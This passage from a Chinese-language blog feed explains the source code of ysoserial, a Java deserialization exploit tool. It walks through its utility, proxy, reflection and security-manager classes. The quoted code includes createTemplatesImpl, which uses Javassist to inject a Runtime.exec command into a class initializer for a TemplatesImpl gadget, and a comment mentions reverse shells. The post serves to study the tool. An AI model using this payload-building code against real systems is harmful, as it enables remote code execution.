href="https://www.cnblogs.com/tomyyyyy/p/15134420.html">https://www.cnblogs.com/tomyyyyy/p/15134420.html</a></p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全杂谈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ysoserial源码详解</title>
    <link href="/2023/11/12/ysoserial%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/"/>
    <url>/2023/11/12/ysoserial%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="ysoserial源码详解"><a href="#ysoserial源码详解" class="headerlink" title="ysoserial源码详解"></a>ysoserial源码详解</h1><p>IAST后端基本写的差不多了，所以为了写前端，最近正在学习electron，想先拿个东西练练手，于是打算为ysoserial做一个前端界面同时加一些自己的特性，那么既然要二开必然要学习原项目，那么顺手写个文章方便以后复习。</p><h1 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h1><p>ysorerial的代码结构如下，包括这三个块：<br><code>exploit</code>、<code>payloads</code>、<code>secmgr</code></p><img src="/2023/11/12/ysoserial%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/image-20231112221449710.png" class="" title="image-20231112221449710"><p>下面来简单介绍一下每个块的具体用途。</p><h2 id="exploit包"><a href="#exploit包" class="headerlink" title="exploit包"></a>exploit包</h2><p>这个包内的内容主要用于对不同的目标进行实际的攻击。</p><h2 id="payloads包"><a href="#payloads包" class="headerlink" title="payloads包"></a>payloads包</h2><h3 id="annnotation包"><a href="#annnotation包" class="headerlink" title="annnotation包"></a>annnotation包</h3><p>这个包内主要包含了一些注解相关的信息，主要用力标识作者之类的提示信息。</p><h4 id="Authors注解"><a href="#Authors注解" class="headerlink" title="Authors注解"></a>Authors注解</h4><p>这个文件定义了一个注解，其中包含了一些作者信息，是用来标记gadgate的作者的，没什么特别好说的。</p><h4 id="Dependencies注解"><a href="#Dependencies注解" class="headerlink" title="Dependencies注解"></a>Dependencies注解</h4><p>检索依赖信息的注解。</p><h4 id="PayloadTest注解"><a href="#PayloadTest注解" class="headerlink" title="PayloadTest注解"></a>PayloadTest注解</h4><p>用来标记gadgate是否需要被测试，是否测试的时候会引发什么异常情况之类的东西，是用来测试gadgate的。</p><h3 id="Util包"><a href="#Util包" class="headerlink" title="Util包"></a>Util包</h3><p>Util模块是一个工具模块，里面包含了像类文件操作，反射操作等的小工具，为yso中大量使用的重复性操作做一个封装。</p><h4 id="ClassFiles类"><a href="#ClassFiles类" class="headerlink" title="ClassFiles类"></a>ClassFiles类</h4><p><code>ClassFiles</code>类的作用是处理类文件，在<code>ysoserial</code>中经常会涉及到类文件读取的操作，因此将其放在了一个单独的类里面方便使用，详细说说其中的各种方法。</p><ul><li><code>classAsFile</code>方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">classAsFile</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz)</span> &#123;<br><span class="hljs-keyword">return</span> classAsFile(clazz, <span class="hljs-literal">true</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">classAsFile</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-type">boolean</span> suffix)</span> &#123;<br>String str;<br><span class="hljs-keyword">if</span> (clazz.getEnclosingClass() == <span class="hljs-literal">null</span>) &#123;<br>str = clazz.getName().replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>str = classAsFile(clazz.getEnclosingClass(), <span class="hljs-literal">false</span>) + <span class="hljs-string">&quot;$&quot;</span> + clazz.getSimpleName();<br>&#125;<br><span class="hljs-keyword">if</span> (suffix) &#123;<br>str += <span class="hljs-string">&quot;.class&quot;</span>;<br>&#125;<br><span class="hljs-keyword">return</span> str;  <br>&#125;<br></code></pre></td></tr></table></figure><p><code>classAsFile</code>方法有两个重载，总的来说是获取<code>class</code>的路径用的，这个方法在处理反射、类加载器、或者需要根据类名获取类文件路径的场景中非常有用。例如，在自定义类加载器或进行字节码分析时，这种将类名转换为类文件路径的功能是非常基础且重要的。<br>第二个重载也就是核心所在，通过<code>getEnclosingClass()</code>方法获取传入的是否是内部类，如果不是那么直接返回如<code>com/springkill/clazz</code>这样的字段，如果是那么就返回<code>com/springkill/clazz$1</code>这样的字段，然后根据<code>suffix</code>表示的内容判断在末尾是否加上<code>.class</code>的后缀。</p><ul><li><code>classAsBytes</code>方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] classAsBytes(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz) &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> classAsFile(clazz);<br><span class="hljs-keyword">final</span> <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> ClassFiles.class.getClassLoader().getResourceAsStream(file);<br><span class="hljs-keyword">if</span> (in == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;couldn&#x27;t find &#x27;&quot;</span> + file + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>&#125;<br><span class="hljs-keyword">final</span> <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-type">int</span> len;<br><span class="hljs-keyword">while</span> ((len = in.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>out.write(buffer, <span class="hljs-number">0</span>, len);<br>&#125;<br><span class="hljs-keyword">return</span> out.toByteArray();<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法就是简单的将类转换为<code>byte[]</code>供后面使用。</p><h4 id="Gadgets类"><a href="#Gadgets类" class="headerlink" title="Gadgets类"></a>Gadgets类</h4><p>总的来说这个类包含了多个方法，主要用于动态创建和操作Java对象。<br>先说两个内部类：</p><h5 id="内部类：StubTransletPayload类"><a href="#内部类：StubTransletPayload类" class="headerlink" title="内部类：StubTransletPayload类"></a>内部类：StubTransletPayload类</h5><p>这个内部类用于演示反序列化，继承自<code>AbstractTranslet</code>类，并且实现了<code>transform</code>方法，为后面的操作提供一个看起来无害的”载体”。</p><h5 id="内部类：Foo类"><a href="#内部类：Foo类" class="headerlink" title="内部类：Foo类"></a>内部类：Foo类</h5><p>定义了序列化版本，没有多余操作，后文将作为辅助类使用。</p><h5 id="类中的方法"><a href="#类中的方法" class="headerlink" title="类中的方法"></a>类中的方法</h5><ul><li>静态代码块区</li></ul><p>这块代码初始化了两个系统属性分别允许<code>TemplatesImpl</code>的反序列化和允许RMI远程加载。</p><ul><li><code>createMemoitizedProxy</code>和<code>createProxy</code>方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createMemoitizedProxy</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; map, <span class="hljs-keyword">final</span> Class&lt;T&gt; iface, <span class="hljs-keyword">final</span> Class&lt;?&gt;... ifaces )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-keyword">return</span> createProxy(createMemoizedInvocationHandler(map), iface, ifaces);<br>&#125;<br><br><span class="hljs-comment">//创建一个自定义sun.reflect.annotation.AnnotationInvocationHandler实例</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> InvocationHandler <span class="hljs-title function_">createMemoizedInvocationHandler</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; map )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-keyword">return</span> (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);<br>&#125;<br><br><span class="hljs-comment">//动态创建代理，实现所有给定接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createProxy</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> InvocationHandler ih, <span class="hljs-keyword">final</span> Class&lt;T&gt; iface, <span class="hljs-keyword">final</span> Class&lt;?&gt;... ifaces )</span> &#123;<br><span class="hljs-keyword">final</span> Class&lt;?&gt;[] allIfaces = (Class&lt;?&gt;[]) Array.newInstance(Class.class, ifaces.length + <span class="hljs-number">1</span>);<br>allIfaces[ <span class="hljs-number">0</span> ] = iface;<br><span class="hljs-keyword">if</span> ( ifaces.length &gt; <span class="hljs-number">0</span> ) &#123;<br>System.arraycopy(ifaces, <span class="hljs-number">0</span>, allIfaces, <span class="hljs-number">1</span>, ifaces.length);<br>&#125;<br><span class="hljs-comment">//使用cast进行类型转换</span><br><span class="hljs-keyword">return</span> iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));<br>&#125;<br></code></pre></td></tr></table></figure><p>这两个方法创建了任意代理类，实现了动态创建任意接口的实现并且进行自定义，其中调用的<code>createMemoizedInvocationHandler</code>方法创建一个自定义的<code>sun.reflect.annotation.AnnotationInvocationHandler</code>实例，然后通过<code>createProxy</code>创建一个代理类。</p><ul><li><code>createMap</code>方法</li></ul><p>使用给定的<code>key</code>和<code>value</code>创建一个<code>HashMap</code>，因为ysoserial在使用过程中需要频繁地创建<code>HashMap</code>所以将这个操作封装。</p><ul><li>两个<code>createTemplatesImpl</code>方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">createTemplatesImpl</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String command )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//检查properXalan的值是否被设定为了True，如果是那么就使用if块内的逻辑，否则调用重载方法</span><br><span class="hljs-keyword">if</span> ( Boolean.parseBoolean(System.getProperty(<span class="hljs-string">&quot;properXalan&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>)) ) &#123;<br><span class="hljs-keyword">return</span> createTemplatesImpl(<br>command,<br>Class.forName(<span class="hljs-string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>),<br>Class.forName(<span class="hljs-string">&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;</span>),<br>Class.forName(<span class="hljs-string">&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;</span>));<br>&#125;<br><br><span class="hljs-keyword">return</span> createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);<br>&#125;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createTemplatesImpl</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span><br><span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//反射创建实例</span><br><span class="hljs-keyword">final</span> <span class="hljs-type">T</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> tplClass.newInstance();<br><br><span class="hljs-comment">// use template gadget class</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>( StubTransletPayload.class));<br>pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(abstTranslet));<br><span class="hljs-keyword">final</span> <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.get(StubTransletPayload.class.getName());<br><span class="hljs-comment">// run command in static initializer</span><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span><br><span class="hljs-comment">// 初始化cmd字符串</span><br><span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +<br>command.replace(<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;\\\\&quot;</span>).replace(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;\\\&quot;&quot;</span>) +<br><span class="hljs-string">&quot;\&quot;);&quot;</span>;<br><span class="hljs-comment">// 插入cmd到静态代码块</span><br>clazz.makeClassInitializer().insertAfter(cmd);<br><span class="hljs-comment">// 给类设置名字 sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span><br>clazz.setName(<span class="hljs-string">&quot;ysoserial.Pwner&quot;</span> + System.nanoTime());<br><span class="hljs-comment">// 设置父类</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">superC</span> <span class="hljs-operator">=</span> pool.get(abstTranslet.getName());<br>clazz.setSuperclass(superC);<br><br><span class="hljs-comment">// 转换为字节码数组</span><br><span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] classBytes = clazz.toBytecode();<br><br><span class="hljs-comment">// inject class bytes into instance</span><br>Reflections.setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;<br>classBytes, ClassFiles.classAsBytes(Foo.class)<br>&#125;);<br><br><span class="hljs-comment">// required to make TemplatesImpl happy</span><br>Reflections.setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Pwnr&quot;</span>);<br>Reflections.setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, transFactory.newInstance());<br><span class="hljs-keyword">return</span> templates;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个类主要是用来初始化<code>TemplatesImpl</code>的。<br>第一个<code>createTemplatesImpl</code>方法通过检查<code>properXalan</code>属性的值来判断是使用内置的<code>org.apache.xalan.xsltc.trax.TemplatesImpl</code>还是使用外部 Apache Xalan 项目提供的类（这并不是一个标准的官方系统属性），如果为<code>True</code>那么就使用重载方法传入的类。<br>那么再来说说重载方法，先实例化了一个<code>templates</code>，然后使用<code>Javassist</code>进行字节码操作，创建一个<code>ClassPool</code>的实例，然后将内部类<code>StubTransletPayload.class</code>和传入的<code>abstTranslet</code>放入其中，然后获取<code>StubTransletPayload</code>的<code>CtClass</code>表示<code>clazz</code>（<code>CtClass</code>是<code>Javassist</code>中表示类的对象），然后将<code>command</code>包装成<code>Runtime</code>执行命令的代码，最后插入到<code>clazz</code>的静态代码块中，最后修改<code>clazz</code>的父类，并将clazz转换为字节码数组。<br>以上准备工作做完后开始使用反射修改<code>templates</code>的<code>_bytecodes</code>字段，将刚才准备好的<code>clazz</code>的字节码表示和内部类<code>Foo</code>写入其中，然后设置<code>_name</code>字段和<code>_tfactory</code>字段，其中<code>_tfactory</code>字段需要一个<code>TransformerFactoryImpl</code>实例，由传入的<code>transFactory</code>类使用反射来创建。</p><ul><li>makeMap方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">makeMap</span> <span class="hljs-params">( Object v1, Object v2 )</span> <span class="hljs-keyword">throws</span> Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,<br>IllegalAccessException, InvocationTargetException &#123;<br><span class="hljs-type">HashMap</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-comment">// 反射设置size字段为2</span><br>Reflections.setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>Class nodeC;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-comment">// 对于Java8之后的HashMap，获取java.util.HashMap$Node</span><br>nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>&#125;<br><span class="hljs-keyword">catch</span> ( ClassNotFoundException e ) &#123;<br><span class="hljs-comment">// 对于Java8之前的HashMap，获取java.util.HashMap$Entry</span><br>nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>&#125;<br><span class="hljs-comment">// 获取构造函数并设置setAccessible以供直接访问，创建节点</span><br><span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCons</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>Reflections.setAccessible(nodeCons);<br><br><span class="hljs-comment">// 创建数组用来存储nodeC节点</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br><span class="hljs-comment">// 将v1和v2作为key、value放入到节点中，然后再插入法哦数组内，最后将数组放到HashMap中</span><br>Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>Reflections.setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br><span class="hljs-keyword">return</span> s;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个类用来初始化<code>HashMap</code>实例，首先创建一个<code>HashMap</code>然后设置其大小为2，根据JDK版本的不同决定<code>nodeC</code>的类型然后获取对应的构造函数，之后创建一个大小为2的数组将两个节点初始化后放入（节点的<code>key</code>和<code>value</code>都为<code>v1</code>或<code>v2</code>），最后将数组放入<code>HashMap</code>中并返回。</p><h4 id="JavaVersion类"><a href="#JavaVersion类" class="headerlink" title="JavaVersion类"></a>JavaVersion类</h4><p>这个没什么好说的，就是检测Java版本用的。</p><h4 id="PayloadRunner类"><a href="#PayloadRunner类" class="headerlink" title="PayloadRunner类"></a>PayloadRunner类</h4><p>这个类看名字就知道是测试payload用的，执行一次序列化和反序列化的过程，看能否达到预期的目的，不过多说。</p><h4 id="Reflections类"><a href="#Reflections类" class="headerlink" title="Reflections类"></a>Reflections类</h4><p>这个类是将yso中经常使用的反射操作做一个封装来方便使用。</p><ul><li><code>setAccessible</code>方法</li></ul><p>这个方法根据使用Java版本的不同为传入的<code>member</code>执行<code>setAccessible</code>操作，来修改<code>Field</code>、<code>Method</code>或<code>Constructor</code>的可访问性。</p><ul><li><code>getField</code>方法</li></ul><p>获取指定类及其父类中声明的特定字段。如果在当前类中找不到字段，会递归地在其夫类中查找。</p><ul><li><code>setFieldValue</code>和<code>getFieldValue</code>方法</li></ul><p>这两个方法分别用于设置和获取对象的指定字段值。它们使用<code>getField</code>来访问字段，然后调用<code>Field.set</code>或<code>Field.get</code>来修改或检索值。</p><ul><li><code>getFirstCtor</code>方法和<code>newInstance</code>方法</li></ul><p>获取构造函数和创建其对应的实例所使用的方法。</p><ul><li><code>createWithoutConstructor</code>方法和<code>createWithConstructor</code>方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createWithoutConstructor</span> <span class="hljs-params">( Class&lt;T&gt; classToInstantiate )</span><br><span class="hljs-keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;<br><span class="hljs-keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);<br>&#125;<br><br><span class="hljs-meta">@SuppressWarnings</span> ( &#123;<span class="hljs-string">&quot;unchecked&quot;</span>&#125; )<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createWithConstructor</span> <span class="hljs-params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="hljs-built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs )</span><br><span class="hljs-keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;<br>Constructor&lt;? <span class="hljs-built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);<br>setAccessible(objCons);<br><span class="hljs-comment">// 生成伪构造函数</span><br>Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);<br>setAccessible(sc);<br><span class="hljs-keyword">return</span> (T)sc.newInstance(consArgs);<br>&#125;<br></code></pre></td></tr></table></figure><p>这两个方法比较有意思，<code>createWithConstructor</code>使用了<code>newConstructorForSerialization</code>方法创建一个伪构造函数，然后实例化并返回。</p><blockquote><p><code>newConstructorForSerialization</code>方法不需要对应的类有默认构造函数，也不需要真正地执行构造函数就可以直接创建一个对象实例。因为它通过字节码的形式生成了<code>ConstructorAccessor</code>接口。</p></blockquote><h3 id="ObjectPayload接口"><a href="#ObjectPayload接口" class="headerlink" title="ObjectPayload接口"></a>ObjectPayload接口</h3><p>这个接口是所有payload的父类，也就是链子具体实现的父类，接口本身没什么，不过它里面还有一个<code>Utils</code>的内部类，可以详细说说这个内部类中的各种方法。</p><ul><li><code>getPayloadClasses</code>方法</li></ul><p>该方法用来查找和返回所有实现了<code>ObjectPayload</code>接口的类，没什么特别的。</p><ul><li><code>getPayloadClass</code>方法</li></ul><p>通过名字加载具体的链子实现，并且判断是不是<code>ObjectPayload</code>的子类，如果不是则不加载。</p><ul><li><code>makePayloadObject</code>方法</li></ul><p>使用<code>getPayloadClass</code>方法获取具体的链子的类，然后将其实例化。</p><ul><li>两个<code>releasePayload</code>方法</li></ul><p>用来清理<code>Payload</code>。</p><h3 id="ReleaseableObjectPayload接口"><a href="#ReleaseableObjectPayload接口" class="headerlink" title="ReleaseableObjectPayload接口"></a>ReleaseableObjectPayload接口</h3><p>这个接口是用来和<code>releasePayload</code>方法配合使用，用来清理释放指定<code>Payload</code>的。</p><h2 id="secmgr包"><a href="#secmgr包" class="headerlink" title="secmgr包"></a>secmgr包</h2><p>这个包里面包含了两个<code>SecurityManager</code>的子类，用来更改安全检查的一些逻辑。</p><h3 id="DelegateSecurityManager类"><a href="#DelegateSecurityManager类" class="headerlink" title="DelegateSecurityManager类"></a>DelegateSecurityManager类</h3><p>作为一个代理，继承自<code>SecurityManage</code>，指定一个<code>SecurityManager</code>实例进行安全检查用。<br>前面为了支持<code>JDK10</code>以后的兼容性，将<code>getInCheck</code>、<code>checkTopLevelWindow</code>、<code>checkSystemClipboardAccess</code>、<code>checkAwtEventQueueAccess</code>、<code>checkMemberAccess</code>的具体实现清空。<br>然后重写了<code>SecurityManager</code>中的很多方法，将其具体处理委托给成员变量<code>securityManager</code>。</p><h3 id="ExecCheckingSecurityManager类"><a href="#ExecCheckingSecurityManager类" class="headerlink" title="ExecCheckingSecurityManager类"></a>ExecCheckingSecurityManager类</h3><p>这个类同样继承自<code>SecurityManage</code>类，用来检查是否执行命令，并决定是否抛出异常。</p><h2 id="Deserializer类"><a href="#Deserializer类" class="headerlink" title="Deserializer类"></a>Deserializer类</h2><p>这个类封装了在yso中经常使用的反序列化操作，这段代码和前面的<code>PayloadRunner</code>配合使用来测试<code>payload</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Deserializer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Callable</span>&lt;Object&gt; &#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] bytes;<br><br><span class="hljs-comment">// 将接受的字节数组存入成员变量</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">Deserializer</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> &#123; <span class="hljs-built_in">this</span>.bytes = bytes; &#125;<br><br><span class="hljs-comment">// 实现call方法，调用时反序列化字节数组</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">call</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-keyword">return</span> deserialize(bytes);<br>&#125;<br><br><span class="hljs-comment">// 数组转换为流</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] serialized)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br><span 